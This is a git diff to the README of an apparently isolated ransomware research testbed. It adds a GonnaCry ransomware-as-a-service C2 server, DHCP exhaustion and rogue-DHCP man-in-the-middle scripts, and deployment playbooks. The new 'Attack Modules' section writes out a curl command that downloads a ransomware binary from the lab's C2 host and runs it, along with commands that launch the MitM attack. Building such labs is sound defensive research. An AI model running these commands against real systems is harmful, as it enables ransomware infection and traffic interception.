@@ -35,6 +35,7 @@ The testbed allows researchers to safely evaluate:
 | dhcp1       | DHCP Server       | Kea DHCP           | 10.10.10.2        | infra-net      |
 | backup1     | Backup Server     | Samba              | 10.10.10.20       | infra-net      |
 | client1     | Enterprise Client | Ubuntu             | Dynamic (10.10.20.150–200) | client-net |
+| c2server    | C2 / RaaS Server  | Flask + PyInstaller binaries | 173.168.0.50 | wan-net |
 
 ### Network Topology
 
@@ -42,21 +43,23 @@ The testbed allows researchers to safely evaluate:
 Host Machine
     │
     ├── virbr1 (wan-net, 173.168.0.0/24) ──── gateway1 (enp2s0, 173.168.0.10)
-    │                                              │
-    │                                          gateway1 (enp1s0, 10.10.0.1)
-    │                                              │  NAT + nftables
-    ├── virbr2 (link-net, 10.10.0.0/24) ─────────┤
-    │                                              │
+    │                                    │          │
+    │                              c2server          │
+    │                            (173.168.0.50)  gateway1 (enp1s0, 10.10.0.1)
+    │                            Flask C2/RaaS       │  NAT + nftables
+    ├── virbr2 (link-net, 10.10.0.0/24) ────────────┤
+    │                                                │
     │                                         coreswitch (enp3s0, 10.10.0.2)
     │                                         routes: infra ↔ client ↔ uplink
-    │                                              │
-    ├── virbr3 (infra-net, 10.10.10.0/24) ────────┤── dns1 (.53), dhcp1 (.2), backup1 (.20)
-    │                                              │
-    └── virbr4 (client-net, 10.10.20.0/24) ───────┘── client1 (dynamic)
+    │                                                │
+    ├── virbr3 (infra-net, 10.10.10.0/24) ──────────┤── dns1 (.53), dhcp1 (.2), backup1 (.20)
+    │                                                │
+    └── virbr4 (client-net, 10.10.20.0/24) ─────────┘── client1 (dynamic)
 ```
 
 - **gateway1** is the sole NAT/internet exit (masquerades on wan-net)
 - **coreswitch** routes between infra-net, client-net, and uplink to gateway1 — no NAT
+- **c2server** sits on wan-net (173.168.0.50) — reachable from clients via gateway1 masquerade; hosts Flask C2 on port 80
 - **All internal bridges are isolated** (no libvirt host IP/forwarding) — host has no direct route to infra/client nets
 - **Ansible reaches infra VMs via ProxyJump** through gateway1 (173.168.0.10)
 
@@ -80,6 +83,21 @@ Host Machine
 
 ```text
 RansomwareTestbed/
+├── attacks/                        Attack scripts (non-GonnaCry)
+│   ├── dhcp_attack_combined.sh     DHCP exhaustion + rogue DHCP (MitM)
+│   ├── dhcp_exhaustion.py
+│   ├── mitm_intercept.sh
+│   └── rogue_dhcp_server.sh
+├── GonnaCry/                       RaaS module (GonnaCry)
+│   ├── src/
+│   │   ├── GonnaCry/               Encryptor + decryptor Python source
+│   │   └── Server/                 C2 Flask server
+│   │       ├── server.py
+│   │       ├── private_key.key
+│   │       ├── public_key.key
+│   │       └── binaries/           Pre-built ELF binaries (build on Ubuntu)
+│   ├── build_binaries.sh           PyInstaller build script (run on Ubuntu)
+│   └── keygen_server.py            RSA-2048 keypair generator
 ├── configs/
 │   ├── firewall/
 │   │   └── gateway.nft
@@ -99,11 +117,14 @@ RansomwareTestbed/
 │   ├── create_coreswitch_vm.yml
 │   ├── create_infra_vms.yml
 │   ├── create_client_vms.yml
+│   ├── create_c2_vm.yml
 │   ├── configure_gateway.yml
 │   ├── configure_coreswitch.yml
 │   ├── configure_dns.yml
 │   ├── configure_dhcp.yml
 │   ├── configure_backup.yml
+│   ├── configure_c2.yml
+│   ├── deploy_attack_scripts.yml
 │   ├── snapshots.yml
 │   ├── destroy_clients.yml
 │   └── destroy_lab.yml
@@ -324,6 +345,7 @@ Expected virtual machines:
 - `dhcp1`
 - `backup1`
 - `client1`
+- `c2server`
 
 ---
 
@@ -335,13 +357,19 @@ Credentials are split by VM group:
 
 | Group | User | Auth |
 |-------|------|------|
-| gateway1, coreswitch, dns1, dhcp1, backup1, web1 | `admin` | SSH key (`~/.ssh/id_ed25519`) |
+| gateway1, coreswitch, dns1, dhcp1, backup1, web1, c2server | `admin` | SSH key (`~/.ssh/id_ed25519`) |
 | client1, client2, … | `student` | password `student` |
 
 **gateway1** — direct on WAN interface:
 
 ```bash
 ssh -i ~/.ssh/id_ed25519 admin@173.168.0.10
+```
+
+**c2server** — direct on WAN interface:
+
+```bash
+ssh -i ~/.ssh/id_ed25519 admin@173.168.0.50
 ```
 
 **Infra VMs** (coreswitch, dns1, dhcp1, backup1, web1) — ProxyJump through gateway1:
@@ -406,6 +434,59 @@ A typical evaluation workflow:
    - DNS/DHCP behavior
 6. Restore VMs from snapshots.
 7. Repeat experiments safely.
+
+---
+
+## 🎯 Attack Modules
+
+### GonnaCry — RaaS (Ransomware-as-a-Service)
+
+Full ransomware-as-a-service simulation. C2 server hosts pre-built ELF binaries; victims download and execute via a simulated phishing link.
+
+**Crypto chain:** AES-256-GCM per file → RSA-2048 client keypair → client private key encrypted with server public key → server holds private key for decryption.
+
+**Deploy C2 server:**
+
+```bash
+ansible-playbook -i inventory/hosts.ini playbooks/create_c2_vm.yml -e "project_root=$(pwd)"
+ansible-playbook -i inventory/hosts.ini playbooks/configure_c2.yml -e "project_root=$(pwd)"
+```
+
+**Simulate phishing click on victim (client1):**
+
+```bash
+# Phase 1 — infection
+curl -s http://173.168.0.50/download-gonnacry/ -o /tmp/gonnacry \
+  && chmod +x /tmp/gonnacry && /tmp/gonnacry
+
+# Phase 3 — decryption (after payment)
+curl -s http://173.168.0.50/download-decryptor/ -o /tmp/decryptor \
+  && chmod +x /tmp/decryptor && /tmp/decryptor
+```
+
+See `GonnaCry/README.md` for full architecture, keypair setup, and binary build instructions.
+
+---
+
+### DHCP MitM Attack
+
+Rogue DHCP + ARP poisoning to intercept client traffic. Two modes: stealth (observe only) and mitm (active intercept).
+
+**Deploy attack scripts to attacker VM:**
+
+```bash
+ansible-playbook -i inventory/hosts.ini playbooks/deploy_attack_scripts.yml
+```
+
+**Run from attacker VM:**
+
+```bash
+# Exhaust DHCP pool, then serve rogue DHCP with attacker as gateway
+sudo bash /opt/attacks/dhcp_attack_combined.sh mitm
+
+# Intercept and log traffic
+sudo bash /opt/attacks/mitm_intercept.sh
+```
 
 ---
 
